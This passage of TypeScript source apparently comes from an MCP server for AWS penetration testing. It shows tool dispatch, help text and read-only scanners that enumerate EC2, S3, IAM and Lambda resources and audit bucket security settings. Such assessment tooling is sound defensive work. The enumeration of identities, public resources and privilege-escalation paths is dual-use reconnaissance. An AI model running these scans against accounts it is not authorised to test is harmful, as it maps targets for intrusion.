          args?.minSeverity as string || 'HIGH'
        ) }] };

      case "analyze_eks_attack_surface":
        return { content: [{ type: "text", text: await analyzeEKSAttackSurface(
          args?.region as string,
          args?.clusterName as string | undefined
        ) }] };

      case "detect_privesc_patterns":
        return { content: [{ type: "text", text: await detectPrivescPatterns(
          args?.principalArn as string | undefined,
          args?.includeRemediation !== false
        ) }] };

      default:
        return {
          content: [{ type: "text", text: `Unknown tool: ${name}` }],
          isError: true,
        };
    }
  } catch (error: any) {
    return {
      content: [{ type: "text", text: `Error: ${error.message}` }],
      isError: true,
    };
  }
});

// ============================================
// IMPLEMENTATION FUNCTIONS - ORGANIZED BY CATEGORY
// ============================================

// ========== CACHE MANAGEMENT FUNCTIONS ==========

function getCacheStats(): string {
  const stats = cache.stats();
  
  let output = `# Cache Statistics\n\n`;
  output += `**Status:** Enabled [OK]\n`;
  output += `**Cached Items:** ${stats.size}\n\n`;
  
  if (stats.size > 0) {
    output += `## Cached Keys\n\n`;
    output += `| Key | Type |\n`;
    output += `|-----|------|\n`;
    
    for (const key of stats.keys.slice(0, 20)) {
      const type = key.split(':')[0] || 'unknown';
      output += `| \`${key.substring(0, 50)}${key.length > 50 ? '...' : ''}\` | ${type} |\n`;
    }
    
    if (stats.keys.length > 20) {
      output += `\n*...and ${stats.keys.length - 20} more items*\n`;
    }
  } else {
    output += `*No items cached yet. Run some scans to populate cache.*\n`;
  }
  
  output += `\n## Cache Benefits\n\n`;
  output += `- **Speed:** Repeated scans return instantly from cache\n`;
  output += `- **Rate Limits:** Reduces AWS API calls, avoids throttling\n`;
  output += `- **TTL:** Cache auto-expires (5 min default)\n\n`;
  output += `## Commands\n\n`;
  output += `- \`cache_stats\` - View this report\n`;
  output += `- \`cache_clear\` - Clear all cache\n`;
  output += `- \`cache_clear pattern: "ec2"\` - Clear EC2 cache only\n`;
  
  return output;
}

function clearCache(pattern?: string): string {
  if (pattern) {
    // Clear specific pattern
    const stats = cache.stats();
    let cleared = 0;
    
    for (const key of stats.keys) {
      if (key.toLowerCase().includes(pattern.toLowerCase())) {
        cache.clear(key);
        cleared++;
      }
    }
    
    return `[OK] Cleared ${cleared} cached items matching "${pattern}"`;
  } else {
    // Clear all
    const count = cache.stats().size;
    cache.clear();
    return `[OK] Cleared all ${count} cached items. Fresh data will be fetched on next scan.`;
  }
}

// ========== UTILITY FUNCTIONS ==========

function getHelpText(): string {
  return `# AWS Penetration Testing MCP Server v1.0.0

##  Available Tools (27 Total)

### Enumeration Tools (10)

**1. whoami** - Identify current AWS identity
- Usage: \`#mcp_nimbus_whoami\`
- Returns: IAM user/role, account ID, ARN

**2. enumerate_ec2_instances** - List EC2 instances
- Usage: \`#mcp_nimbus_enumerate_ec2_instances region: us-east-1\`
- Returns: Instance IDs, public IPs, security groups, IAM roles

**3. enumerate_s3_buckets** - List all S3 buckets
- Usage: \`#mcp_nimbus_enumerate_s3_buckets\`
- Returns: Bucket names and creation dates

**4. enumerate_iam_users** - List IAM users
- Usage: \`#mcp_nimbus_enumerate_iam_users\`
- Returns: Users with access key age, password last used

**5. enumerate_iam_roles** - List IAM roles
- Usage: \`#mcp_nimbus_enumerate_iam_roles\`
- Returns: Roles with trust policies

**6. enumerate_rds_databases** - List RDS instances
- Usage: \`#mcp_nimbus_enumerate_rds_databases region: us-east-1\`
- Returns: DB instances, encryption, public access status

**7. enumerate_vpcs** - List VPCs
- Usage: \`#mcp_nimbus_enumerate_vpcs region: us-east-1\`
- Returns: VPCs with subnets and CIDR blocks

**8. enumerate_lambda_functions** - List Lambda functions
- Usage: \`#mcp_nimbus_enumerate_lambda_functions region: us-east-1\`
- Returns: Functions with runtimes, IAM roles, env vars

**9. enumerate_eks_clusters** - List EKS clusters
- Usage: \`#mcp_nimbus_enumerate_eks_clusters region: us-east-1\`
- Returns: Clusters with public endpoint status

**10. enumerate_public_resources** - Map attack surface
- Usage: \`#mcp_nimbus_enumerate_public_resources region: us-east-1\`
- Returns: All publicly accessible resources

### Security Scanning Tools (10)

**11. scan_s3_bucket_security** - Deep S3 analysis
- Usage: \`#mcp_nimbus_scan_s3_bucket_security bucketName: my-bucket\`
- Checks: Public access, encryption, bucket policies, ACLs, versioning, logging

**12. analyze_security_groups** - Find dangerous SG rules
- Usage: \`#mcp_nimbus_analyze_security_groups region: us-east-1\`
- Detects: Open ports, 0.0.0.0/0 access, SSH/RDP exposure

**13. check_iam_policies** - Detect privilege escalation
- Usage: \`#mcp_nimbus_check_iam_policies\`
- Finds: Wildcard permissions, IAM modify rights

**14. check_kms_keys** - Analyze KMS configuration
- Usage: \`#mcp_nimbus_check_kms_keys region: us-east-1\`
- Checks: Key state, rotation status

**15. scan_secrets_manager** - Check secrets security
- Usage: \`#mcp_nimbus_scan_secrets_manager region: us-east-1\`
- Checks: Rotation enabled, last change date

**16. scan_dynamodb_security** - DynamoDB security
- Usage: \`#mcp_nimbus_scan_dynamodb_security region: us-east-1\`
- Checks: Encryption at rest, point-in-time recovery, backups

**17. scan_api_gateway_security** - API Gateway security
- Usage: \`#mcp_nimbus_scan_api_gateway_security region: us-east-1\`
- Checks: Authorization, throttling, logging, SSL certificates

**18. scan_cloudfront_security** - CloudFront security
- Usage: \`#mcp_nimbus_scan_cloudfront_security\`
- Checks: SSL/TLS versions, origin access, geo-restrictions, WAF

**19. scan_elasticache_security** - ElastiCache security
- Usage: \`#mcp_nimbus_scan_elasticache_security region: us-east-1\`
- Checks: Encryption in transit/at rest, auth tokens, security groups

**20. get_guardduty_findings** - GuardDuty threats
- Usage: \`#mcp_nimbus_get_guardduty_findings region: us-east-1\`
- Returns: AWS-detected threats with severity ratings
- Optional: \`severity: CRITICAL\` to filter findings

**21. scan_sns_security** - SNS topic security
- Usage: \`#mcp_nimbus_scan_sns_security region: us-east-1\`
- Checks: Encryption (KMS), access policies, subscriptions, cross-account access

**22. scan_sqs_security** - SQS queue security
- Usage: \`#mcp_nimbus_scan_sqs_security region: us-east-1\`
- Checks: Encryption (KMS), access policies, dead letter queues, message retention

**23. scan_cognito_security** - Cognito identity & user pools
- Usage: \`#mcp_nimbus_scan_cognito_security region: us-east-1\`
- Checks: Unauthenticated access, MFA configuration, password policies, email verification

### Attack Analysis Tools (2)

**24. analyze_attack_paths** - Identify attack chains
- Usage: \`#mcp_nimbus_analyze_attack_paths region: us-east-1\`
- Finds: EC2→IAM role chains, Lambda privilege escalation

**25. generate_security_report** - Comprehensive report
- Usage: \`#mcp_nimbus_generate_security_report region: us-east-1\`
- Formats: markdown (default), pdf, html, csv
- Example: \`format: pdf outputFile: C:\\\\reports\\\\aws-security.pdf\`

**26. help** - This help text
- Usage: \`#mcp_nimbus_help\`

**27. generate_tra_report** - Comprehensive TRA report [NEW]
- Usage: \`#mcp_nimbus_generate_tra_report region: us-east-1\`
- Features: Risk scoring, compliance mapping (CIS/NIST/PCI), MITRE ATT&CK, remediation roadmap
- Frameworks: \`framework: cis\` or \`nist\` or \`pci\` or \`all\`
- Formats: \`format: pdf outputFile: C:\\\\reports\\\\tra-report.pdf\`

## Quick Start Workflow

\`\`\`bash
# 1. Identify your AWS identity
#mcp_nimbus_whoami

# 2. Find public attack surface
#mcp_nimbus_enumerate_public_resources region: us-east-1

# 3. Analyze Security Groups
#mcp_nimbus_analyze_security_groups region: us-east-1

# 4. Check IAM for privilege escalation
#mcp_nimbus_check_iam_policies

# 5. Generate comprehensive report
#mcp_nimbus_generate_security_report region: us-east-1 format: pdf outputFile: C:\\\\reports\\\\aws-report.pdf
\`\`\`

## Documentation
- **README.md** - Complete feature overview
- **USAGE.md** - Detailed pentesting workflows
- **Built-in examples** - Each tool returns actionable findings

## Common Findings
- [CRITICAL] CRITICAL: Public EC2 instances, open management ports, wildcard IAM
- [HIGH] HIGH: Unencrypted S3/RDS, old access keys, Lambda secrets in env vars
- [MEDIUM] MEDIUM: No KMS rotation, insufficient backups, EKS without logging

## [WARN] Authentication Required
Run \`aws configure\` before using tools. Default region: ${DEFAULT_REGION}
`;
}

// ========== ENUMERATION & DISCOVERY IMPLEMENTATIONS ==========

async function whoami(region?: string): Promise<string> {
  const client = new STSClient({ region: region || DEFAULT_REGION });
  const command = new GetCallerIdentityCommand({});
  const response = await client.send(command);

  return `# AWS Identity Information

**User ID:** ${response.UserId}
**Account:** ${response.Account}
**ARN:** ${response.Arn}
**Region:** ${region || DEFAULT_REGION}

[OK] Successfully authenticated to AWS
`;
}

// ========== CONSOLIDATED WRAPPER FUNCTIONS ==========

async function analyzeS3Security(bucketName?: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "both";
  let output = "# S3 Security Analysis\n\n";
  if (mode === "enumerate" || mode === "both") {
    output += "## S3 Buckets Enumeration\n" + await enumerateS3Buckets() + "\n\n";
  }
  if (mode === "security" || mode === "both") {
    if (!bucketName && mode === "security") return "Error: bucketName required for security mode";
    if (bucketName) output += `## Security Analysis: ${bucketName}\n` + await scanS3BucketSecurity(bucketName) + "\n";
  }
  return output;
}

async function analyzeIAMUsers(policyArn?: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "both";
  let output = "# IAM Users & Policies Analysis\n\n";
  if (mode === "enumerate" || mode === "both") {
    output += "## IAM Users\n" + await enumerateIAMUsers() + "\n\n";
  }
  if (mode === "policies" || mode === "both") {
    output += "## IAM Policies Analysis\n" + await checkIAMPolicies(policyArn) + "\n";
  }
  return output;
}

// Multi-region Network Security analysis
async function analyzeNetworkSecurityMultiRegion(region: string, scanMode?: string): Promise<string> {
  const regions = resolveRegions(region);
  
  if (regions.length === 1) {
    return analyzeNetworkSecurity(regions[0], scanMode);
  }
  
  let output = `# Network Security - Multi-Region Scan\n\n`;
  output += `**Scanning ${regions.length} regions:** ${region === 'all' ? 'ALL' : region === 'common' ? 'COMMON' : region}\n\n`;
  
  for (const r of regions) {
    try {
      const regionResult = await analyzeNetworkSecurity(r, scanMode);
      if (!regionResult.includes("No VPCs found") || !regionResult.includes("No security groups")) {
        output += `## Region: ${r}\n\n`;
        output += regionResult.replace(/# Network Security Analysis\n\n/g, '');
        output += `\n---\n\n`;
      }
    } catch (error: any) {
      // Skip regions with access issues
    }
  }
  
  return output;
}

async function analyzeNetworkSecurity(region: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "both";
  let output = "# Network Security Analysis\n\n";
  if (mode === "vpcs" || mode === "both") {
    output += "## VPCs\n" + await enumerateVPCs(region) + "\n\n";
  }
  if (mode === "security_groups" || mode === "both") {
    output += "## Security Groups\n" + await analyzeSecurityGroups(region) + "\n";
  }
  return output;
}

// Multi-region Lambda Security analysis
async function analyzeLambdaSecurityMultiRegion(region: string, scanMode?: string): Promise<string> {
  const regions = resolveRegions(region);
  
  if (regions.length === 1) {
    return analyzeLambdaSecurity(regions[0], scanMode);
  }
  
  let output = `# Lambda Security - Multi-Region Scan\n\n`;
  output += `**Scanning ${regions.length} regions:** ${region === 'all' ? 'ALL' : region === 'common' ? 'COMMON' : region}\n\n`;
  
  let totalFunctions = 0;
  
  for (const r of regions) {
    try {
      const client = new LambdaClient({ region: r });
      const command = new ListFunctionsCommand({});
      const response = await client.send(command);
      
      if (response.Functions && response.Functions.length > 0) {
        output += `## Region: ${r} (${response.Functions.length} functions)\n\n`;
        totalFunctions += response.Functions.length;
        
        for (const fn of response.Functions) {
          const name = fn.FunctionName || "N/A";
          const runtime = fn.Runtime || "N/A";
          const role = fn.Role?.split("/").pop() || "N/A";
          output += `- **${name}** (${runtime}) | Role: ${role}\n`;
        }
        output += `\n`;
      }
    } catch (error: any) {
      // Skip regions with access issues
    }
  }
  
  output += `## Summary\n**Total Functions:** ${totalFunctions}\n`;
  
  if (totalFunctions === 0) {
    output += `\n[OK] No Lambda functions found across ${regions.length} regions.\n`;
  }
  
  return output;
}

async function analyzeLambdaSecurity(region: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "both";
  let output = "# Lambda Security Analysis\n\n";
  if (mode === "enumerate" || mode === "both") {
    output += "## Lambda Functions\n" + await enumerateLambdaFunctions(region) + "\n\n";
  }
  if (mode === "roles" || mode === "both") {
    output += "## Service Role Analysis\n" + await findOverlyPermissiveRoles() + "\n";
  }
  return output;
}

async function analyzeMessagingSecurity(region: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "all";
  let output = "# Messaging & Identity Security\n\n";
  if (mode === "sns" || mode === "all") {
    output += "## SNS Topics\n" + await scanSNSSecurity(region) + "\n\n";
  }
  if (mode === "sqs" || mode === "all") {
    output += "## SQS Queues\n" + await scanSQSSecurity(region) + "\n\n";
  }
  if (mode === "cognito" || mode === "all") {
    output += "## Cognito Security\n" + await scanCognitoSecurity(region) + "\n";
  }
  return output;
}

async function analyzeAPIDistributionSecurity(region?: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "both";
  let output = "# API & Distribution Security\n\n";
  if (mode === "api_gateway" || mode === "both") {
    if (!region) region = "us-east-1";
    output += "## API Gateway\n" + await scanAPIGatewaySecurity(region) + "\n\n";
  }
  if (mode === "cloudfront" || mode === "both") {
    output += "## CloudFront Distributions\n" + await scanCloudFrontSecurity() + "\n";
  }
  return output;
}

async function analyzeEncryptionSecurity(region: string, resourceType?: string, tableName?: string): Promise<string> {
  const type = resourceType || "both";
  let output = "# Encryption & Data Security\n\n";
  if (type === "kms" || type === "both") {
    output += "## KMS Keys\n" + await checkKMSKeys(region) + "\n\n";
  }
  if (type === "dynamodb" || type === "both") {
    output += "## DynamoDB Tables\n" + await scanDynamoDBSecurity(region, tableName) + "\n";
  }
  return output;
}

async function analyzeInfrastructureAutomation(region: string, scanMode?: string): Promise<string> {
  const mode = scanMode || "both";
  let output = "# Infrastructure & Automation Security\n\n";
  if (mode === "cloudformation" || mode === "both") {
    output += "## CloudFormation Templates\n" + await scanCloudFormationSecurity(region) + "\n\n";
  }
  if (mode === "eventbridge" || mode === "both") {
    output += "## EventBridge Rules\n" + await scanEventBridgeSecurity(region) + "\n";
  }
  return output;
}

// Multi-region EC2 enumeration
async function enumerateEC2InstancesMultiRegion(region: string): Promise<string> {
  const regions = resolveRegions(region);
  
  if (regions.length === 1) {
    return enumerateEC2Instances(regions[0]);
  }
  
  let output = `# EC2 Instances - Multi-Region Scan\n\n`;
  output += `**Scanning ${regions.length} regions:** ${region === 'all' ? 'ALL' : region === 'common' ? 'COMMON' : region}\n\n`;
  
  let totalInstances = 0;
  const allFindings: string[] = [];
  const regionSummary: { region: string; count: number }[] = [];
  
  for (const r of regions) {
    try {
      const client = new EC2Client({ region: r });
      const command = new DescribeInstancesCommand({});
      const response = await client.send(command);
      
      let regionCount = 0;
      
      if (response.Reservations && response.Reservations.length > 0) {
        output += `## Region: ${r}\n\n`;
        
        for (const reservation of response.Reservations) {
          for (const instance of reservation.Instances || []) {
            regionCount++;
            totalInstances++;
            
            const instanceId = instance.InstanceId || "N/A";
            const state = instance.State?.Name || "unknown";
            const publicIp = instance.PublicIpAddress || "None";
            const privateIp = instance.PrivateIpAddress || "N/A";
            const instanceType = instance.InstanceType || "N/A";
            const iamRole = instance.IamInstanceProfile?.Arn?.split("/").pop() || "None";
            
            output += `- **${instanceId}** (${state}) - ${instanceType} | Public: ${publicIp} | IAM: ${iamRole}\n`;
            
            if (publicIp !== "None") {
              allFindings.push(`[CRITICAL] ${r}: Instance ${instanceId} has public IP ${publicIp}`);
            }
          }
        }
        output += `\n`;
      }
      
      if (regionCount > 0) {
        regionSummary.push({ region: r, count: regionCount });
      }
    } catch (error: any) {
      // Skip regions with access issues or no opt-in
    }
  }
  
  output += `## Summary\n\n`;
  output += `| Region | Instances |\n`;
  output += `|--------|----------|\n`;
  for (const rs of regionSummary) {
    output += `| ${rs.region} | ${rs.count} |\n`;
  }
  output += `| **TOTAL** | **${totalInstances}** |\n\n`;
  
  if (allFindings.length > 0) {
    output += `## Security Findings (${allFindings.length})\n\n`;
    allFindings.forEach(f => output += `${f}\n`);
  }
  
  if (totalInstances === 0) {
    output += `\n[OK] No EC2 instances found across ${regions.length} regions.\n`;
  }
  
  return output;
}

async function enumerateEC2Instances(region: string): Promise<string> {
  // Check cache first
  const cacheKey = `ec2:instances:${region}`;
  const cached = cache.get<string>(cacheKey);
  if (cached) {
    return cached + `\n\n* Cached result (use \`cache_clear pattern: "ec2"\` for fresh data)*`;
  }

  const client = new EC2Client({ region });
  const command = new DescribeInstancesCommand({});
  const response = await withRetry(() => client.send(command));

  let output = `# EC2 Instances in ${region}\n\n`;
  let totalInstances = 0;
  const findings: string[] = [];

  if (!response.Reservations || response.Reservations.length === 0) {
    return `No EC2 instances found in ${region}`;
  }

  for (const reservation of response.Reservations) {
    for (const instance of reservation.Instances || []) {
      totalInstances++;
      const instanceId = instance.InstanceId || "N/A";
      const state = instance.State?.Name || "unknown";
      const publicIp = instance.PublicIpAddress || "None";
      const privateIp = instance.PrivateIpAddress || "N/A";
      const instanceType = instance.InstanceType || "N/A";
      const securityGroups = instance.SecurityGroups?.map(sg => sg.GroupId).join(", ") || "None";
      const iamRole = instance.IamInstanceProfile?.Arn?.split("/").pop() || "None";

      output += `## Instance: ${instanceId}\n`;
      output += `- **State:** ${state}\n`;
      output += `- **Type:** ${instanceType}\n`;
      output += `- **Public IP:** ${publicIp}\n`;
      output += `- **Private IP:** ${privateIp}\n`;
      output += `- **Security Groups:** ${securityGroups}\n`;
      output += `- **IAM Role:** ${iamRole}\n\n`;

      if (publicIp !== "None") {
        findings.push(`[CRITICAL] CRITICAL: Instance ${instanceId} has public IP ${publicIp} - potential attack surface`);
      }
      if (iamRole !== "None") {
        findings.push(`[MEDIUM] INFO: Instance ${instanceId} has IAM role ${iamRole} - check for privilege escalation`);
      }
    }
  }

  output += `\n## Summary\n**Total Instances:** ${totalInstances}\n\n`;
  
  if (findings.length > 0) {
    output += `## Security Findings\n`;
    findings.forEach(f => output += `${f}\n`);
  }

  // Cache result for 2 minutes (EC2 can change frequently)
  cache.set(cacheKey, output, 120000);

  return output;
}

async function enumerateS3Buckets(): Promise<string> {
  const command = new ListBucketsCommand({});
  const response = await s3Client.send(command);

  if (!response.Buckets || response.Buckets.length === 0) {
    return "No S3 buckets found";
  }

  let output = `# S3 Buckets\n\n**Total Buckets:** ${response.Buckets.length}\n\n`;

  for (const bucket of response.Buckets) {
    output += `- **${bucket.Name}** (Created: ${bucket.CreationDate?.toISOString()})\n`;
  }

  output += `\n[TIP] Use scan_s3_bucket_security to analyze individual bucket security\n`;

  return output;
}

// ========== SECURITY ANALYSIS IMPLEMENTATIONS ==========

// Helper function to get bucket region
async function getBucketRegion(bucketName: string): Promise<string> {
  try {
    const command = new GetBucketLocationCommand({ Bucket: bucketName });
    const response = await s3Client.send(command);
    // LocationConstraint is null for us-east-1, otherwise contains region name
    return response.LocationConstraint || "us-east-1";
  } catch (error) {
    return DEFAULT_REGION;
  }
}

async function scanS3BucketSecurity(bucketName: string): Promise<string> {
  try {
    const findings: string[] = [];
    
    // Auto-detect bucket region to avoid PermanentRedirect errors
    const bucketRegion = await getBucketRegion(bucketName);
    const regionalS3Client = new S3Client({ region: bucketRegion });

    // 1. Check public access block
    let section1 = `## 0. Bucket Region\n- Region: ${bucketRegion}\n\n`;
    try {
      const publicAccessCommand = new GetPublicAccessBlockCommand({ Bucket: bucketName });
      const publicAccess = await regionalS3Client.send(publicAccessCommand);
      
      const blockConfig = publicAccess.PublicAccessBlockConfiguration;
      section1 += `## 1. Public Access Block Configuration\n`;
      section1 += `- Block Public ACLs: ${blockConfig?.BlockPublicAcls ? "[ENABLED]" : "[DISABLED]"}\n`;
      section1 += `- Block Public Policy: ${blockConfig?.BlockPublicPolicy ? "[ENABLED]" : "[DISABLED]"}\n`;
      section1 += `- Ignore Public ACLs: ${blockConfig?.IgnorePublicAcls ? "[ENABLED]" : "[DISABLED]"}\n`;
      section1 += `- Restrict Public Buckets: ${blockConfig?.RestrictPublicBuckets ? "[ENABLED]" : "[DISABLED]"}\n\n`;
      
      if (!blockConfig?.BlockPublicAcls || !blockConfig?.BlockPublicPolicy || !blockConfig?.IgnorePublicAcls || !blockConfig?.RestrictPublicBuckets) {
        findings.push("CRITICAL: Public access block not fully enabled - bucket may be exposed");
      }
    } catch (error: any) {
      if (error.name === "NoSuchPublicAccessBlockConfiguration") {
        findings.push("CRITICAL: No public access block configuration - bucket is PUBLICLY ACCESSIBLE!");
        section1 += `## 1. Public Access Block: [NOT_CONFIGURED] CRITICAL RISK\n\n`;
      } else {
        section1 += `## 1. Public Access Block: [ERROR] ${error.name}\n\n`;
      }
    }

    // 2. Check bucket policy for public access
    let section2 = "";
    try {
      const policyCommand = new GetBucketPolicyCommand({ Bucket: bucketName });
      const policyResponse = await regionalS3Client.send(policyCommand);
      
      section2 += `## 2. Bucket Policy\n`;
      
      if (policyResponse.Policy) {
        const policy = JSON.parse(policyResponse.Policy);
        const policyString = JSON.stringify(policy);
        
        section2 += `- Policy Exists: [YES]\n`;
        
        // Check for public access in policy
        const hasPublicPrincipal = policyString.includes('"Principal":"*"') || policyString.includes('"Principal": "*"') || policyString.includes('"Principal":{"AWS":"*"}') || policyString.includes('"Principal": {"AWS": "*"}');
        const hasPublicEffect = policyString.includes('"Effect":"Allow"') || policyString.includes('"Effect": "Allow"');
        
        if (hasPublicPrincipal && hasPublicEffect) {
          findings.push("CRITICAL: Bucket policy allows public access with wildcard Principal");
          section2 += `- Public Access: [EXPOSED] Policy allows access from anyone (*)\n`;
        } else if (!hasPublicPrincipal) {
          section2 += `- Public Access: [SECURE] No wildcard principals\n`;
        }
        
        // Check for overly permissive actions
        if (policyString.includes('"Action":"s3:*"') || policyString.includes('"Action":["s3:*"]')) {
          findings.push("HIGH: Bucket policy contains wildcard action (s3:*) - overly permissive");
          section2 += `- Wildcard Actions: [WARNING] Policy uses s3:* action\n`;
        }
        
        // Check for cross-account access
        const accountPattern = /"arn:aws:iam::\d{12}:/g;
        const accounts = policyString.match(accountPattern);
        if (accounts && accounts.length > 0) {
          section2 += `- Cross-Account Access: [WARNING] Policy allows access from ${accounts.length} external account(s)\n`;
          findings.push(`MEDIUM: Bucket policy allows cross-account access - verify these are authorized`);
        }
        
        section2 += `\n`;
      } else {
        section2 += `- Policy Exists: [NO]\n\n`;
      }
    } catch (error: any) {
      if (error.name === "NoSuchBucketPolicy") {
        section2 += `- Policy Exists: [NO] good - default deny\n\n`;
      } else {
        section2 += `- Policy: [ERROR] ${error.name}\n\n`;
      }
    }

    // Now build output with all sections
    let output = `# S3 Bucket Security Analysis: ${bucketName}\n\n`;
    output += section1 + section2;

  // 3. Check bucket ACLs
  try {
    const aclCommand = new GetBucketAclCommand({ Bucket: bucketName });
    const aclResponse = await regionalS3Client.send(aclCommand);
    
    output += `## 3. Access Control List (ACL)\n`;
    
    const grants = aclResponse.Grants || [];
    let hasPublicRead = false;
    let hasPublicWrite = false;
    
    for (const grant of grants) {
      const grantee = grant.Grantee;
      const permission = grant.Permission;
      
      // Check for public access via ACL
      if (grantee?.URI === "http://acs.amazonaws.com/groups/global/AllUsers") {
        if (permission === "READ") {
          hasPublicRead = true;
          findings.push("[CRITICAL] CRITICAL: Bucket ACL grants public READ access to everyone");
        }
        if (permission === "WRITE") {
          hasPublicWrite = true;
          findings.push("[CRITICAL] CRITICAL: Bucket ACL grants public WRITE access to everyone");
        }
        if (permission === "FULL_CONTROL") {
          findings.push("[CRITICAL] CRITICAL: Bucket ACL grants FULL_CONTROL to everyone - complete compromise!");
        }
      }
      
      // Check for authenticated users (any AWS account)
      if (grantee?.URI === "http://acs.amazonaws.com/groups/global/AuthenticatedUsers") {
        findings.push(`[HIGH] HIGH: Bucket ACL grants ${permission} to all authenticated AWS users`);
      }
    }
    
    output += `- Public READ: ${hasPublicRead ? "[FAIL] YES (CRITICAL)" : "[OK] No"}\n`;
    output += `- Public WRITE: ${hasPublicWrite ? "[FAIL] YES (CRITICAL)" : "[OK] No"}\n`;
    output += `- Total Grants: ${grants.length}\n\n`;
    
  } catch (error: any) {
    output += `## 3. ACL: [WARN] Could not retrieve ACL\n\n`;
  }

  // 4. Check if bucket policy is public
  try {
    const policyStatusCommand = new GetBucketPolicyStatusCommand({ Bucket: bucketName });
    const policyStatus = await regionalS3Client.send(policyStatusCommand);
    
    if (policyStatus.PolicyStatus?.IsPublic) {
      findings.push("[CRITICAL] CRITICAL: AWS confirms bucket policy is PUBLIC");
      output += `## 4. Policy Status: [FAIL] BUCKET IS PUBLIC\n\n`;
    } else {
      output += `## 4. Policy Status: [OK] Not public\n\n`;
    }
  } catch (error: any) {
    output += `## 4. Policy Status: [WARN] Could not retrieve\n\n`;
  }

  // 5. Check encryption
  try {
    const encryptionCommand = new GetBucketEncryptionCommand({ Bucket: bucketName });
    const encryption = await regionalS3Client.send(encryptionCommand);
    const algorithm = encryption.ServerSideEncryptionConfiguration?.Rules?.[0]?.ApplyServerSideEncryptionByDefault?.SSEAlgorithm;
    const kmsKeyId = encryption.ServerSideEncryptionConfiguration?.Rules?.[0]?.ApplyServerSideEncryptionByDefault?.KMSMasterKeyID;
    
    output += `## 5. Encryption\n`;
    output += `- Enabled: [OK] Yes\n`;
    output += `- Algorithm: ${algorithm}\n`;
    if (kmsKeyId) {
      output += `- KMS Key: ${kmsKeyId}\n`;
    }
    output += `\n`;
  } catch (error: any) {
    if (error.name === "ServerSideEncryptionConfigurationNotFoundError") {
      findings.push("[HIGH] HIGH: Server-side encryption not enabled - data at rest not protected");
      output += `## 5. Encryption: [FAIL] Not enabled\n\n`;
    } else {
      output += `## 5. Encryption: [WARN] Could not retrieve\n\n`;
    }
  }

  // 6. Check versioning
  try {
    const versioningCommand = new GetBucketVersioningCommand({ Bucket: bucketName });
    const versioning = await regionalS3Client.send(versioningCommand);
    
    output += `## 6. Versioning\n`;
    const status = versioning.Status || "Disabled";
    output += `- Status: ${status === "Enabled" ? "[OK]" : "[FAIL]"} ${status}\n`;
    output += `- MFA Delete: ${versioning.MFADelete === "Enabled" ? "[OK] Enabled" : "[FAIL] Disabled"}\n\n`;
    
    if (status !== "Enabled") {
      findings.push("[MEDIUM] MEDIUM: Versioning not enabled - cannot recover from accidental deletion");
    }
    if (versioning.MFADelete !== "Enabled") {
      findings.push("[MEDIUM] MEDIUM: MFA Delete not enabled - no protection against malicious deletion");
    }
  } catch (error: any) {
    output += `## 6. Versioning: [WARN] Could not retrieve versioning status\n\n`;
  }

  // 7. Check logging
  try {
    const loggingCommand = new GetBucketLoggingCommand({ Bucket: bucketName });
    const logging = await regionalS3Client.send(loggingCommand);
    
    output += `## 7. Access Logging\n`;
    if (logging.LoggingEnabled) {
      output += `- Enabled: [OK] Yes\n`;
      output += `- Target Bucket: ${logging.LoggingEnabled.TargetBucket}\n`;
      output += `- Target Prefix: ${logging.LoggingEnabled.TargetPrefix || "/"}\n\n`;
    } else {
      output += `- Enabled: [FAIL] No\n\n`;
      findings.push("[MEDIUM] MEDIUM: Access logging not enabled - cannot audit bucket access");
    }
  } catch (error: any) {
    output += `## 7. Access Logging: [WARN] Could not retrieve logging status\n\n`;
  }

  // Summary
  output += `## Security Findings Summary (${findings.length})\n\n`;
  if (findings.length === 0) {
    output += `[OK] No security issues found - bucket is well-configured!\n`;
  } else {
    const critical = findings.filter(f => f.includes("[CRITICAL]")).length;
    const high = findings.filter(f => f.includes("[HIGH]")).length;
    const medium = findings.filter(f => f.includes("[MEDIUM]")).length;
    
    output += `**Severity Breakdown:**\n`;
    output += `- [CRITICAL] CRITICAL: ${critical}\n`;
    output += `- [HIGH] HIGH: ${high}\n`;
    output += `- [MEDIUM] MEDIUM: ${medium}\n\n`;
    
    output += `**Findings:**\n`;
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
  } catch (error: any) {
    return `# S3 Bucket Security Analysis: ${bucketName}\n\n**ERROR:** ${error.message}\n\nFull error: ${JSON.stringify(error)}\n`;
  }
}

async function enumerateIAMUsers(): Promise<string> {
  const command = new ListUsersCommand({});
  const response = await iamClient.send(command);

  if (!response.Users || response.Users.length === 0) {
    return "No IAM users found";
  }

  let output = `# IAM Users\n\n**Total Users:** ${response.Users.length}\n\n`;
  const findings: string[] = [];

  for (const user of response.Users) {
    output += `## ${user.UserName}\n`;
    output += `- **User ID:** ${user.UserId}\n`;
    output += `- **ARN:** ${user.Arn}\n`;
    output += `- **Created:** ${user.CreateDate?.toISOString()}\n`;
    output += `- **Password Last Used:** ${user.PasswordLastUsed?.toISOString() || "Never/No console access"}\n`;

    // Check for old users
    const daysSinceCreation = user.CreateDate ? Math.floor((Date.now() - user.CreateDate.getTime()) / (1000 * 60 * 60 * 24)) : 0;
    if (daysSinceCreation > 365) {
      findings.push(`[MEDIUM] INFO: User ${user.UserName} created ${daysSinceCreation} days ago - review if still needed`);
    }

    // Check password usage
    const daysSincePasswordUse = user.PasswordLastUsed ? Math.floor((Date.now() - user.PasswordLastUsed.getTime()) / (1000 * 60 * 60 * 24)) : 999;
    if (daysSincePasswordUse > 90 && user.PasswordLastUsed) {
      findings.push(`[HIGH] MEDIUM: User ${user.UserName} hasn't used password in ${daysSincePasswordUse} days - potential inactive account`);
    }

    output += `\n`;
  }

  if (findings.length > 0) {
    output += `## Security Findings\n`;
    findings.forEach(f => output += `${f}\n`);
  }

  return output;
}

async function enumerateIAMRoles(): Promise<string> {
  // Check cache first - IAM is global and changes rarely
  const cacheKey = `iam:roles`;
  const cached = cache.get<string>(cacheKey);
  if (cached) {
    return cached + `\n\n* Cached result (use \`cache_clear pattern: "iam"\` for fresh data)*`;
  }

  const command = new ListRolesCommand({});
  const response = await withRetry(() => iamClient.send(command));

  if (!response.Roles || response.Roles.length === 0) {
    return "No IAM roles found";
  }

  let output = `# IAM Roles\n\n**Total Roles:** ${response.Roles.length}\n\n`;
  const findings: string[] = [];

  for (const role of response.Roles) {
